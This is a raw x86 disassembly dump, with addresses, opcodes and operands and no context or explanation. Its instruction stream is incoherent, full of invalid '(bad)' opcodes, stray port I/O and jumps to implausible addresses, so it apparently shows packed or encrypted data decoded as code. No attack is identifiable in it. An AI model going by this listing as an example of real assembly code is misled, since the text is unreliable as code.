  4231a1:	je     0x423193
  4231a3:	scas   eax,DWORD PTR es:[edi]
  4231a4:	sbb    ebp,DWORD PTR [ebx*4+0x32f94b53]
  4231ab:	xor    eax,0x63518482
  4231b0:	add    eax,0x6dab7500
  4231b5:	add    al,0xd
  4231b7:	jbe    0x42316d
  4231b9:	sti    
  4231ba:	adc    ah,BYTE PTR [eax-0x41]
  4231bd:	je     0x42314e
  4231bf:	pusha  
  4231c0:	rcl    DWORD PTR [eax-0x10],0x5f
  4231c4:	sbb    ecx,DWORD PTR [edi+esi*2+0x454fffdb]
  4231cb:	add    ebx,DWORD PTR [edx+0x7ddceab4]
  4231d1:	shr    BYTE PTR [ecx+0x3e],0x66
  4231d5:	inc    esp
  4231d6:	cmp    esi,DWORD PTR ds:0x27994489
  4231dc:	dec    edi
  4231dd:	push   eax
  4231de:	retf   0x4ff6
  4231e1:	adc    dh,BYTE PTR ds:0x69c47edb
  4231e7:	pop    esi
  4231e8:	and    BYTE PTR [eax+eax*1],0x0
  4231ec:	add    BYTE PTR [eax],al
  4231ee:	add    BYTE PTR ds:0xfcffffdc,al
  4231f4:	daa    
  4231f5:	and    BYTE PTR [eax-0x10],dl
  4231f8:	add    ch,BYTE PTR ds:0x6c527d20
  4231fe:	inc    eax
  4231ff:	pop    ecx
  423200:	cmp    DWORD PTR ds:[ebx+0x3a],edx
  423204:	jg     0x42326b
  423206:	and    ch,bl
  423208:	add    cl,ch
  42320a:	add    esp,DWORD PTR ds:0xd11ff57b
  423210:	(bad)  
  423212:	or     DWORD PTR [ebp+0x2],esi
  423215:	fs (bad) 
  423217:	jmp    0x6ace0340
  42321c:	add    ch,cl
  42321e:	test   cl,0x26
  423221:	cmc    
  423222:	mul    BYTE PTR [eax+0xe]
  423225:	test   BYTE PTR [ebx+0x75],0xed
  423229:	mov    ebp,0xf479591f
  42322e:	inc    DWORD PTR [ebx+0x47f6e942]
  423234:	in     eax,dx
  423235:	mov    ch,0x1f
  423237:	jge    0x423226
  423239:	cmp    edi,DWORD PTR [esi+0x4ea26b1]
  42323f:	ret    0xb651
  423242:	imul   ecx,DWORD PTR [edx],0xfffffffd
  423245:	call   0x7559304d
  42324a:	adc    BYTE PTR [ebp-0x668796fe],dh
  423250:	std    
  423251:	out    0x70,eax
  423253:	add    BYTE PTR [eax],al
  423255:	add    BYTE PTR [eax],al
  423257:	add    BYTE PTR [esi-0x13],cl
  42325a:	xor    eax,0xe9003d20
  42325f:	add    ebp,eax
  423261:	test   DWORD PTR ds:0xe90275f8,eax
  423267:	test   BYTE PTR [ecx],0x26
  42326a:	int    0x3
  42326c:	jne    0x423270
  42326e:	jo     0x4232af
  423270:	xchg   ecx,eax
  423271:	xor    ch,BYTE PTR [edi+edi*1+0x59]
  423275:	xor    al,BYTE PTR [eax]
  423277:	sbb    DWORD PTR [edx-0x1c32db8b],esp
  42327d:	inc    ebp
  42327e:	and    al,0xe5
  423280:	adc    eax,ebp
  423282:	ds jmp 0x2966785b
  423288:	fldcw  WORD PTR [esi]
  42328a:	ds jmp 0x2d667853
  423290:	mov    ecx,0x33e93ec3
  423295:	inc    edi
  423296:	and    al,0x21
  423298:	dec    ebp
  423299:	lds    edi,FWORD PTR [esi]
  42329b:	jmp    0xb56679c3
  4232a0:	xchg   edi,eax
  4232a1:	ret    
  4232a2:	ds jmp 0xb96679bb
  4232a8:	scas   al,BYTE PTR es:[edi]
  4232a9:	ret    
  4232aa:	ds jmp 0x9d6679b3
  4232b0:	rol    ebx,cl
  4232b2:	ds jmp 0x36adc4d6
  4232b8:	and    esp,DWORD PTR [ebp+0x1]
  4232bb:	pop    esp
  4232bc:	add    BYTE PTR [eax],al
  4232be:	add    BYTE PTR [eax],al
  4232c0:	add    BYTE PTR [edx+0x76e9fc26],ah
  4232c6:	add    ch,al
  4232c8:	push   eax
  4232c9:	rol    DWORD PTR [edx],1
  4232cb:	add    BYTE PTR [edx-0x53],ah
  4232ce:	cli    
  4232cf:	xchg   BYTE PTR [ebp+0x7ae81262],dl
  4232d5:	sti    
  4232d6:	call   0x26a4a5d6
  4232db:	adc    al,0x1
  4232dd:	pop    esp
  4232de:	(bad)  
  4232df:	cli    
  4232e0:	out    dx,al
  4232e1:	inc    esp
  4232e2:	fcmovu st,st(4)
  4232e4:	pop    eax
  4232e5:	jno    0x4232e9
  4232e7:	pop    ebx
  4232e8:	aas    
  4232e9:	test   dl,al
  4232eb:	push   edi
  4232ec:	bound  ebp,QWORD PTR [edx+0x76e5be4d]
  4232f2:	push   ebp
  4232f3:	xchg   DWORD PTR [eax],eax
  4232f5:	mov    al,ds:0x9e38ec7f
  4232fa:	(bad)  
  4232fb:	call   DWORD PTR [edx-0x76]
  4232fe:	xor    DWORD PTR [ebp-0x48],0xffffffb4
  423302:	xchg   DWORD PTR [ecx],edi
  423304:	call   ebx
  423306:	jns    0x423365
  423308:	or     BYTE PTR [edx-0x7f],bh
  42330b:	jae    0x423359
  42330d:	pushf  
  42330e:	lods   eax,DWORD PTR ds:[esi]
  42330f:	inc    ebp
  423310:	dec    DWORD PTR [esi+eax*1-0x72717c]
  423317:	dec    DWORD PTR [edi+ebx*4-0xbba76f2]
  42331e:	cmp    al,0xf7
  423320:	jne    0x423316
  423322:	dec    ebx
  423323:	add    DWORD PTR [ebx+0x0],0x0
  423327:	add    BYTE PTR [eax],al
  423329:	add    BYTE PTR [esi],ah
  42332b:	xlat   BYTE PTR ds:[ebx]
  42332c:	pusha  
  42332d:	add    al,0xb3
  42332f:	cmc    
  423330:	cmp    eax,0xffffffd5
  423333:	jae    0x42332d
  423335:	xor    DWORD PTR [ebx+0x7a2475f5],0x1
  42333c:	add    DWORD PTR [edi],ecx
  42333e:	cwde   
  42333f:	dec    ebp
  423340:	add    DWORD PTR [eax],eax
  423342:	sbb    al,0x57
  423344:	mov    BYTE PTR [ebx],dl
  423346:	or     al,0xff
  423348:	div    BYTE PTR ds:0x3be250
  42334e:	jae    0x42334b
  423350:	sbb    edx,DWORD PTR [ebx]
  423352:	fdiv   st(6),st
  423354:	cmp    al,0x2
  423356:	or     eax,0xcde8ffff
  42335b:	(bad)  
  42335c:	(bad)  
  42335d:	dec    DWORD PTR [ebx]
  42335f:	xlat   BYTE PTR ds:[ebx]
  423360:	and    BYTE PTR [eax],0xdc
  423363:	dec    BYTE PTR [esi-0x18]
  423366:	and    al,0x1f
  423368:	add    BYTE PTR [eax],al
  42336a:	popa   
  42336b:	pushf  
  42336c:	enter  0xb3fd,0xf5
  423370:	call   0xf53ca8d2
  423375:	sti    
  423376:	lock gs ret 
  423379:	std    
  42337a:	mov    edx,0x288d4fc3
  42337f:	lea    eax,[eax-0x433f5538]
  423385:	popa   
  423386:	jne    0x423361
  423388:	xchg   DWORD PTR [ebp-0x65],eax
  42338b:	pop    esp
  42338c:	mov    edi,0x74
  423391:	add    BYTE PTR [eax],al
  423393:	pop    edi
  423394:	jo     0x423396
  423396:	sti    
  423397:	add    BYTE PTR [ebp-0x3b668a78],dh
  42339d:	dec    BYTE PTR [edx]
  42339f:	ret    
  4233a0:	cwde   
  4233a1:	in     al,dx
  4233a2:	fmul   DWORD PTR [esi+0x7147829b]
  4233a8:	mov    esp,0x2bca50be
  4233ad:	(bad)  
  4233ae:	out    0xa3,eax
  4233b0:	call   0xcf432fa9
  4233b5:	ror    DWORD PTR [eax-0x7d18ae50],cl
  4233bb:	aam    0xdb
  4233bd:	(bad)  
  4233be:	mov    eax,0xffffdb4b
  4233c3:	add    BYTE PTR [edi-0x39],bl
  4233c6:	std    
  4233c7:	sub    dh,BYTE PTR [ecx]
  4233c9:	mov    ebp,0x469b7500
  4233ce:	jne    0x4233ec
  4233d0:	in     al,0x42
  4233d2:	cli    
  4233d3:	sbb    BYTE PTR [edi-0x41],0x0
  4233d7:	jne    0x4233b4
  4233d9:	imul   eax,DWORD PTR [eax],0x4582db8f
  4233df:	std    
  4233e0:	mov    esi,DWORD PTR [eax]
  4233e2:	rcr    ch,0x67
  4233e5:	cli    
  4233e6:	cli    
  4233e7:	jmp    0xa75e:0x72f83ab4
  4233ee:	add    BYTE PTR [ebp+0x2],dh
  4233f1:	jmp    0x522c8474
  4233f6:	xor    al,0x0
  4233f8:	add    BYTE PTR [eax],al
  4233fa:	add    BYTE PTR [eax],al
  4233fc:	inc    eax
  4233fd:	add    ch,cl
  4233ff:	pop    ebp
  423400:	js     0x423479
  423402:	and    al,0xf4
  423404:	and    eax,0xae063cda
  423409:	jmp    0xb63f873
  42340e:	dec    ebx
  42340f:	xchg   DWORD PTR [eax],esp
  423411:	repnz in al,0x78
  423414:	imul   edi,ecx,0x59
  423417:	dec    ecx
  423418:	mov    ds:0x99516c51,eax
  42341d:	fimul  DWORD PTR ds:0x5ee97e1a
  423423:	push   ecx
  423424:	ins    DWORD PTR es:[edi],dx
  423425:	fucom  st(7)
  423427:	xor    eax,0x78a97e35
  42342c:	(bad)  
  42342e:	cmp    cl,BYTE PTR [ecx+0x69]
  423431:	cmp    ah,BYTE PTR [ecx]
  423433:	js     0x4234a8
  423435:	cmp    dh,BYTE PTR [ecx-0x5b3f5688]
  42343b:	bnd je 0x42341b
  42343e:	mov    ds:0x5767c269,eax
  423443:	or     al,al
  423445:	inc    ecx
  423446:	je     0x423491
  423448:	in     eax,dx
  423449:	fst    DWORD PTR [eax-0x4016d1d4]
  42344f:	call   FWORD PTR [eax+0x3d3929fa]
  423455:	shl    BYTE PTR [esi-0x3af0f1fd],1
  42345b:	adc    al,0xb5
  42345d:	add    bl,BYTE PTR [esi-0xc]
  423460:	add    BYTE PTR [eax],al
  423462:	add    BYTE PTR [eax],al
  423464:	add    al,bh
  423466:	out    dx,eax
  423467:	xchg   ebp,eax
  423468:	sbb    al,0xf2
  42346a:	ds adc eax,0x7050755e
  423470:	adc    dh,dl
  423472:	add    DWORD PTR [eax],eax
  423474:	or     DWORD PTR [edx-0xa],0x23ee93d
  42347b:	add    bl,ch
  42347d:	jbe    0x4234f6
  42347f:	jge    0x423422
  423481:	dec    ecx
  423482:	inc    esp
  423483:	add    al,0xc1
  423485:	(bad)  
  423486:	sub    ebx,edi
  423488:	into   
  423489:	repnz shl DWORD PTR [ebp-0x11],0x4c
  42348e:	fimul  DWORD PTR [eax+0x39]
  423491:	jno    0x423495
  423493:	sti    
  423494:	cmp    al,0x95
  423496:	fld    DWORD PTR [eax+0x39]
  423499:	jno    0x42349d
  42349b:	and    BYTE PTR [esi+eax*4],0x1
  42349f:	or     esp,DWORD PTR [ebp+0x36]
  4234a2:	in     eax,dx
  4234a3:	sti    
  4234a4:	xchg   esi,eax
  4234a5:	add    ebp,DWORD PTR [edi-0x8]
  4234a8:	cmp    DWORD PTR [esi+edi*8+0x65f686fa],0xf9ede9fb
  4234b3:	icebp  
  4234b4:	jmp    0xec64:0xf384fb79
  4234bb:	sti    
  4234bc:	(bad)  
  4234bd:	cmc    
  4234be:	ins    DWORD PTR es:[edi],dx
  4234bf:	mov    eax,0xfb29c051
  4234c4:	push   esi
  4234c5:	inc    edi
  4234c6:	pop    eax
  4234c7:	push   eax
  4234c8:	inc    ecx
  4234c9:	add    BYTE PTR [eax],al
  4234cb:	add    BYTE PTR [eax],al
  4234cd:	add    BYTE PTR [esi+esi*2-0x2534b906],dh
  4234d4:	or     BYTE PTR [ecx+0x2f870276],bh
  4234da:	fdiv   DWORD PTR ds:[ebx]
  4234dd:	cs daa 
  4234df:	dec    ebp
  4234e0:	das    
  4234e1:	sub    ebx,eax
  4234e3:	mov    ecx,0x4d76e5be
  4234e8:	xchg   DWORD PTR ds:0xba74d6fb,eax
  4234ee:	pushf  
  4234ef:	push   ebx
  4234f0:	data16 add bh,ah
  4234f3:	xor    BYTE PTR [ebp-0x34],0x14
  4234f7:	int3   
  4234f8:	sub    esi,esi
  4234fa:	jmp    0x4234ed
  4234fc:	xor    DWORD PTR [ebp-0x2c],0xffffff80
  423500:	gs cld 
  423502:	fsub   st(1),st
  423504:	inc    BYTE PTR [eax]
  423506:	add    BYTE PTR es:[ebx+0x74],dl
  42350a:	mov    esp,0x928d1045
  42350f:	cli    
  423510:	dec    edi
  423511:	lea    edi,[ecx]
  423513:	repnz add ebx,0xffffffc4
  423517:	icebp  
  423518:	pushf  
  423519:	add    BYTE PTR [eax+ebp*2-0xe7ce78a],cl
  423520:	adc    eax,0x438ec4
  423525:	push   eax
  423526:	inc    ebx
  423527:	addr16 jge 0x42351e
  42352a:	pop    ss
  42352b:	mov    ebp,0xfe08e9e8
  423530:	call   DWORD PTR [edx+0x0]
  423533:	add    BYTE PTR [eax],al
  423535:	add    BYTE PTR [eax],al
  423537:	jmp    0xd9927778
  42353c:	push   edi
  42353d:	clc    
  42353e:	mov    ecx,DWORD PTR [edi]
  423540:	(bad)  
  423541:	rcr    BYTE PTR [esp+ecx*2-0x2b8a08fd],cl
  423548:	addr16 inc ebp
  42354a:	int3   
  42354b:	stos   DWORD PTR es:[edi],eax
  42354c:	outs   dx,DWORD PTR ds:[esi]
  42354d:	hlt    
  42354e:	lea    ebp,[ecx]
  423550:	div    DWORD PTR [di-0x58]
  423554:	dec    esi
  423555:	bound  esp,QWORD PTR [eax]
  423557:	xlat   BYTE PTR ds:[ebx]
  423558:	retf   0x5ec8
  42355b:	sbb    al,0x3
  42355d:	jnp    0x423523
  42355f:	cmp    al,0x7e
  423561:	clc    
  423562:	pop    ds
  423563:	cmp    eax,DWORD PTR [eax+0x31c00ae]
  423569:	add    edi,0xffffffcc
  42356c:	inc    esp
  42356d:	add    DWORD PTR [eax+0x75],ebp
  423570:	mov    cl,0xd1
  423572:	aas    
  423573:	jne    0x42356d
  423575:	adc    ah,BYTE PTR [eax]
  423577:	xchg   BYTE PTR [ecx-0xecf7701],bl
  42357d:	add    al,0x72
  423580:	push   ebp
  423581:	lea    eax,[eax]
  423583:	jne    0x42355e
  423585:	lock adc eax,0x3fec81
  42358b:	mov    BYTE PTR [eax+0x4675ffff],dl
  423591:	sti    
  423592:	cli    
  423593:	inc    eax
  423594:	loope  0x423586
  423596:	adc    eax,0x3fcc79
  42359b:	add    BYTE PTR [eax],al
  42359d:	add    BYTE PTR [eax],al
  42359f:	add    dh,dh
  4235a1:	cmp    eax,0x2df7fffc
  4235a6:	cld    
  4235a7:	jmp    DWORD PTR [esi]
  4235a9:	xor    al,0x5a
  4235ab:	pop    eax
  4235ac:	pop    ds
  4235ad:	icebp  
  4235ae:	lock xor eax,0x44aead
  4235b4:	and    ch,0x23
  4235b7:	adc    DWORD PTR ds:0xf8f87cd9,esi
  4235bd:	jl     0x423632
  4235bf:	pop    ebp
  4235c0:	inc    dh
  4235c2:	cmp    edx,DWORD PTR [edx]
  4235c4:	mov    ch,0xdb
  4235c6:	pop    ebp
  4235c7:	adc    al,ch
  4235c9:	sbb    eax,0x95005008
  4235ce:	add    edx,DWORD PTR [eax+0x4a]
  4235d1:	sub    DWORD PTR [edx+eax*1-0x31],edi
  4235d5:	adc    DWORD PTR [edi+0x3],esi
  4235d8:	neg    BYTE PTR ds:0xc7ba8d13
  4235de:	pop    ecx
  4235df:	push   eax
  4235e0:	sub    cl,BYTE PTR [ecx]
  4235e2:	jl     0x423629
  4235e4:	ins    DWORD PTR es:[edi],dx
  4235e5:	pop    eax
  4235e6:	ret    
  4235e7:	sbb    BYTE PTR [ebx+0x754c7058],dl
  4235ed:	add    dh,BYTE PTR [eax+0x48]
  4235f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4235f1:	outs   dx,BYTE PTR ds:[esi]
  4235f2:	les    eax,FWORD PTR [ebx+0x77e90a7e]
  4235f8:	pop    esi
  4235f9:	pop    esp
  4235fa:	data16 jo 0x423638
  4235fd:	add    bh,BYTE PTR [ebp+0xb]
  423600:	inc    esi
  423601:	pop    edx
  423602:	ret    
  423603:	add    BYTE PTR [eax],al
  423605:	add    BYTE PTR [eax],al
  423607:	add    BYTE PTR [eax],al
  423609:	mov    ds:0x75038102,eax
  42360e:	cli    
  42360f:	call   0xe9403def
  423614:	add    esi,eax
  423616:	ret    0x855
  423619:	add    eax,0x2614be04
  42361e:	ficomp DWORD PTR [edx-0x3dfd8aa2]
  423624:	jns    0x4236a3
  423626:	(bad)  
  423628:	jp     0x4235c9
  42362a:	in     eax,0xf7
  42362c:	ret    
  42362d:	ds inc esp
  42362f:	push   cs
  423630:	mov    ebp,0x58e8fed3
  423635:	repnz (bad) 
  423637:	callw  0xb7b8
  42363b:	test   DWORD PTR [eax+0x2a],esp
  42363e:	dec    esp
  42363f:	xor    bl,BYTE PTR [edx+0x73]
  423642:	pop    ebp
  423643:	enter  0xa918,0x6e
  423647:	xchg   ecx,eax
  423648:	xchg   edi,eax
  423649:	inc    esi
  42364a:	add    ch,cl
  42364c:	jl     0x4235ff
  42364e:	push   ds
  42364f:	int    0x88
  423651:	xor    eax,0x5c43eb6f
  423656:	push   ebp
  423657:	call   0x589aab5f
  42365c:	out    dx,eax
  42365d:	pusha  
  42365e:	pop    edx
  42365f:	test   DWORD PTR [ebx+0x75],0x95194252
  423666:	adc    BYTE PTR [ecx+0xae0d03],ch
  42366c:	adc    DWORD PTR [eax],eax
  42366e:	add    BYTE PTR [eax],al
  423670:	add    BYTE PTR [eax],al
  423672:	jno    0x423676
  423674:	test   BYTE PTR [ecx],ch
  423676:	adc    al,BYTE PTR [ecx+0x276e848]
  42367c:	jmp    0x44b047
  423681:	bound  esi,QWORD PTR [ebp+0x4d5c101e]
  423687:	push   ds
  423688:	adc    al,0x11
  42368a:	cmp    eax,0x61e9004b
  42368f:	ds and al,0xe5
  423692:	imul   ecx
  423694:	sti    
  423695:	fdivp  st(2),st
  423697:	popf   
  423698:	add    cl,ch
  42369a:	jbe    0x423701
  42369c:	fs add eax,0x39660299
  4236a2:	hlt    
  4236a3:	cmp    eax,0x24f0124
  4236a8:	push   eax
  4236a9:	sar    DWORD PTR ds:0x1fe90147,1
  4236af:	data16 and al,0x9
  4236b2:	idiv   BYTE PTR [ebp+0x1e226a0c]
  4236b8:	or     al,0xed
  4236ba:	or     eax,0x93d6fb6c
  4236bf:	push   cs
  4236c0:	(bad)  
  4236c1:	sti    
  4236c2:	add    bh,BYTE PTR ss:[edi-0x6f]
  4236c6:	xchg   esi,eax
  4236c7:	ins    DWORD PTR es:[edi],dx
  4236c8:	ins    DWORD PTR es:[edi],dx
  4236c9:	jb     0x42366e
  4236cb:	jne    0x423719
  4236cd:	lds    ebx,FWORD PTR [edx+0x7063d714]
  4236d3:	jne    0x423725
  4236d5:	cdq    
  4236d6:	add    BYTE PTR [eax],al
  4236d8:	add    BYTE PTR [eax],al
  4236da:	add    dh,dh
  4236dc:	in     al,dx
  4236dd:	or     esi,ebx
  4236df:	jb     0x42375d
  4236e1:	mov    esi,0x50756852
  4236e6:	xchg   esi,eax
  4236e7:	imul   ah
  4236e9:	add    eax,0xc8fe7ad6
  4236ee:	add    bh,al
  4236f0:	jmp    0x80058781
  4236f5:	repnz add eax,0xa9040cdb
  4236fb:	cwde   
  4236fc:	mov    eax,0xff040774
  423701:	inc    eax
  423702:	xor    dh,BYTE PTR [edi+0x6cbfffc8]
  423708:	sti    
  423709:	xchg   DWORD PTR [ecx],eax
  42370b:	dec    edi
  42370c:	(bad)  
  42370d:	cmp    eax,0xc07b9beb
  423712:	jne    0x4236d8
  423714:	jnp    0x4236e9
  423716:	jne    0x4236c0
  423718:	mov    esp,0xfebc2444
  42371d:	(bad)  
  42371e:	(bad)  
  42371f:	(bad)  
  423721:	outs   dx,DWORD PTR ds:[esi]
  423722:	or     BYTE PTR [edi+0x6d],al
  423725:	or     al,0xff
  423727:	sbb    edi,edx
  423729:	mov    WORD PTR [eax+edi*2+0x32],ds
  42372d:	call   0xf817ebb1
  423732:	lea    ebx,[eax+0x1a]
  423735:	and    BYTE PTR [eax-0x4c],dl
  423738:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423739:	std    
  42373a:	jmp    ebx
  42373c:	imul   eax,DWORD PTR [esp+0x0],0x0
  423744:	add    bh,0xd5
  423747:	ins    DWORD PTR es:[edi],dx
  423748:	mov    edi,?
  42374a:	mov    WORD PTR [eax+ebp*4+0xf],es
  42374e:	push   eax
  42374f:	call   0x395941
  423754:	fnstcw WORD PTR [esi-0x29e37af9]
  42375a:	idiv   edi
  42375c:	sar    DWORD PTR [edx],1
  42375e:	and    al,0x18
  423760:	ins    BYTE PTR es:[edi],dx
  423761:	(bad)  
  423762:	nop
  423763:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423764:	rcl    ch,cl
  423766:	sbb    eax,0xffffffd9
  423769:	mov    ecx,0x60754774
  42376e:	jo     0x423794
  423770:	lea    ebx,[esi-0x13]
  423773:	je     0x4237e1
  423775:	jo     0x423768
  423777:	jg     0x423712
  423779:	std    
  42377a:	and    eax,DWORD PTR [eax]
  42377c:	(bad)  
  423780:	pop    ecx
  423781:	add    DWORD PTR [esi+0x0],edx
  423784:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423785:	adc    DWORD PTR [ebx+0x5c],esi
  423788:	je     0x423763
  42378a:	add    ah,0x69
  42378d:	jg     0x4237b8
  42378f:	lea    edi,[ecx]
  423791:	mov    ebp,0xfc455227
  423796:	adc    cl,BYTE PTR [ebx+ecx*4-0x67]
  42379a:	(bad)  
  42379b:	jle    0x42374e
  42379d:	fdivr  QWORD PTR [edx+0x44]
  4237a0:	cdq    
  4237a1:	mov    ecx,0xde56e84f
  4237a6:	in     al,dx
  4237a7:	sti    
  4237a8:	add    BYTE PTR [eax],al
  4237aa:	add    BYTE PTR [eax],al
  4237ac:	add    dh,dh
  4237ae:	call   0xe850:0xa2404b29
  4237b5:	inc    ebp
  4237b6:	es add al,0x0
  4237b9:	sbb    eax,0x750072e9
  4237be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4237bf:	xor    bh,ah
  4237c1:	xchg   ecx,eax
  4237c2:	pop    ss
  4237c3:	add    al,0xfb
  4237c5:	push   0x754010b5
  4237ca:	fiadd  WORD PTR [ecx]
  4237cc:	add    DWORD PTR [ebp-0x27],esi
  4237cf:	cld    
  4237d0:	cmp    esi,0xffffff8b
  4237d3:	in     al,dx
  4237d4:	sti    
  4237d5:	jb     0x4237cf
  4237d7:	daa    
  4237d8:	sbb    al,0x5d
  4237da:	cmc    
  4237db:	jbe    0x4237d7
  4237dd:	bound  ebx,QWORD PTR [ebp-0xb44a441]
  4237e3:	js     0x4237ca
  4237e5:	mov    al,0xad
  4237e7:	add    eax,DWORD PTR [eax]
  4237e9:	mov    al,ds:0xc2df6e02
  4237ee:	out    dx,al
  4237ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4237f0:	push   eax
  4237f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4237f2:	cmp    DWORD PTR [edx+0x76],edx
  4237f5:	or     DWORD PTR [edi+0x582eafac],0xeb2578f1
  4237ff:	jg     0x4237f5
  423801:	push   ds
  423802:	loop   0x42386a
  423804:	or     ax,0x5c03
  423808:	inc    esi
  423809:	or     DWORD PTR [ebx],esi
  42380b:	adc    esi,ebx
  42380d:	fchs   
  42380f:	sbb    bh,BYTE PTR [eax+0x0]
  423812:	add    BYTE PTR [eax],al
  423814:	add    BYTE PTR [eax],al
  423816:	sbb    eax,0xf9fbb48c
  42381b:	mov    ebp,0x47f80c94
  423820:	inc    ebp
  423821:	push   ebx
  423822:	xchg   edx,eax
  423823:	ret    0xdba9
  423826:	jge    0x4237cf
  423828:	repz jmp 0x423826
  42382b:	mov    edx,0xeacd765c
  423830:	push   ecx
  423831:	mov    BYTE PTR [edi-0xcb5c51f],bh
  423837:	lds    ebp,FWORD PTR [esi]
  423839:	mov    ebp,0x7ee90af3
  42383e:	and    dh,bl
  423840:	popaw  
  423842:	jno    0x423846
  423844:	repnz and DWORD PTR fs:[ebx],edx
  423848:	outs   dx,DWORD PTR fs:[esi]
  42384a:	inc    edi
  42384b:	(bad)  
  42384c:	and    al,0xc4
  42384e:	and    eax,0x8dba328f
  423853:	push   ecx
  423854:	push   eax
  423855:	add    al,0x75
  423857:	xchg   DWORD PTR [ecx+0x5e688271],ebp
  42385d:	add    edx,edi
  42385f:	sbb    eax,0xce8f62c
  423864:	add    edi,DWORD PTR [edi-0x4a]
  423867:	add    al,0x0
  423869:	cpuid  
  42386b:	inc    edi
  42386c:	hlt    
  42386d:	cmc    
  42386e:	(bad)  
  42386f:	fld    QWORD PTR [ebp-0xb]
  423872:	sti    
  423873:	les    esi,FWORD PTR [esi]
  423875:	and    ah,al
  423877:	push   cs
  423878:	outs   dx,BYTE PTR ds:[esi]
  423879:	cmp    eax,DWORD PTR [eax]
  42387b:	add    BYTE PTR [eax],al
  42387d:	add    BYTE PTR [eax],al
  42387f:	rcl    ah,cl
  423881:	ss pop esp
  423883:	mov    ah,0x9e
  423885:	push   eax
  423886:	rcl    DWORD PTR [eax+0x39],cl
  423889:	lea    edi,[edx+edx*1+0x34e1458f]
  423890:	inc    edi
  423891:	or     ebp,ecx
  423893:	mov    DWORD PTR [edi-0x4],edx
  423896:	adc    DWORD PTR [ecx+0x6f],ebp
  423899:	add    cl,ch
  42389b:	cmc    
  42389c:	shl    DWORD PTR [ebx+edi*8+0x73],0x47
  4238a1:	cld    
  4238a2:	fcmovb st,st(0)
  4238a4:	aam    0xef
  4238a6:	push   es
  4238a7:	fs or  ch,al
  4238aa:	arpl   WORD PTR ds:0x3461fbdc,dx
  4238b0:	or     eax,0xe8ce74fb
  4238b5:	pop    esp
  4238b6:	push   ebp
  4238b7:	jns    0x4238bb
  4238b9:	xchg   BYTE PTR [esi+edi*4],bh
  4238bc:	jmp    0xdce20f32
  4238c1:	dec    edi
  4238c2:	shr    DWORD PTR [esi+ebp*2+0x0],0xe9
  4238c7:	push   0x8e45e9b9
  4238cc:	fdiv   st(3),st
  4238ce:	pop    ds
  4238cf:	adc    dl,bl
  4238d1:	test   DWORD PTR [edi-0x16817b71],esi
  4238d7:	jbe    0x4238db
  4238d9:	xchg   bh,dh
  4238db:	cli    
  4238dc:	iret   
  4238dd:	je     0x4238f4
  4238df:	(bad)  
  4238e0:	das    
  4238e1:	leave  
  4238e2:	fiadd  DWORD PTR [eax]
  4238e4:	add    BYTE PTR [eax],al
  4238e6:	add    BYTE PTR [eax],al
  4238e8:	pop    edi
  4238e9:	xor    esi,0x0
  4238ec:	sbb    al,0x53
  4238ee:	or     ecx,DWORD PTR [edx-0x57ffa7e]
  4238f4:	inc    esp
  4238f5:	jo     0x4238fc
  4238f7:	add    dh,0x4b
  4238fa:	jne    0x423902
  4238fc:	es loopne 0x423979
  4238ff:	(bad)  
  423900:	dec    esi
  423901:	dec    ebp
  423902:	dec    ebx
  423903:	mov    dh,BYTE PTR [edx]
  423905:	pop    ebx
  423906:	push   edx
  423907:	rcr    BYTE PTR [eax+esi*8+0x623c7709],1
  42390e:	pop    es
  42390f:	mov    esi,0x4e1c67e
  423914:	inc    edx
  423915:	or     edx,eax
  423917:	data16 lahf 
  423919:	mov    esi,0x5b2aeb30
  42391e:	push   edx
  42391f:	mov    edi,0x7705f08c
  423924:	in     al,dx
  423925:	popa   
  423926:	pop    es
  423927:	mov    esi,0x4e1c6ae
  42392c:	repnz or dl,al
  42392f:	dec    di
  423931:	mov    esi,0x5ab2eb2f
  423936:	push   edx
  423937:	lahf   
  423938:	pop    esp
  423939:	lock add eax,0x761c077
  42393f:	mov    esi,0x4e1c3fe
  423944:	inc    edx
  423945:	add    eax,0xbb1f66c2
  42394a:	dec    edi
  42394b:	sldt   WORD PTR [eax]
  42394e:	add    BYTE PTR [eax],al
  423950:	add    BYTE PTR [ebx],ah
  423952:	fwait
  423953:	ds jmp 0x423974
  423956:	dec    ebp
  423957:	test   dl,dl
  423959:	push   eax
  42395a:	add    eax,0x619dcf7b
  42395f:	mov    DWORD PTR [eax],ecx
  423961:	pop    es
  423962:	rcl    DWORD PTR [edi+0x5e],0xcf
  423966:	adc    eax,0xe1756ac9
  42396b:	popa   
  42396c:	mov    DWORD PTR [ebp+0x11],edi
  42396f:	inc    esi
  423970:	mov    edi,0x54707af8
  423975:	out    dx,eax
  423976:	sar    BYTE PTR [ebx-0x37],cl
  423979:	leave  
  42397a:	daa    
  42397b:	xor    eax,0x1351f5c0
  423980:	jne    0x4239fa
  423982:	mov    bl,0x5
  423984:	pop    eax
  423985:	dec    esi
  423986:	out    0x7f,al
  423988:	stc    
  423989:	pop    esi
  42398a:	mov    esi,0xfcc33dfe
  42398f:	in     eax,dx
  423990:	out    0x8a,eax
  423992:	imul   esp,edi,0x5ce29a39
  423998:	bnd jg 0x42396a
  42399b:	clc    
  42399c:	mov    ecx,0xf104c73c
  4239a1:	fwait
  4239a2:	ins    BYTE PTR es:[edi],dx
  4239a3:	(bad)  
  4239a4:	xor    BYTE PTR [edx+0x38],ch
  4239a7:	out    dx,al
  4239a8:	notrack jmp edx
  4239ab:	jg     0x4239a6
  4239ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4239ae:	mov    fs,ebp
  4239b0:	test   BYTE PTR [esp+ebx*2+0x7f04],ch
  4239b7:	add    BYTE PTR [eax],al
  4239b9:	add    BYTE PTR [ebp-0x3c4d0717],ch
  4239bf:	inc    eax
  4239c0:	add    dh,BYTE PTR [ebx+esi*2-0x7e]
  4239c4:	mov    dh,0xfb
  4239c6:	ret    0xffe8
  4239c9:	popa   
  4239ca:	in     al,dx
  4239cb:	out    dx,eax
  4239cc:	dec    ecx
  4239cd:	mov    edi,0x85da966
  4239d2:	adc    esp,DWORD PTR [edx+0x0]
  4239d5:	pop    eax
  4239d6:	mov    dh,0xfd
  4239d8:	jl     0x4239c6
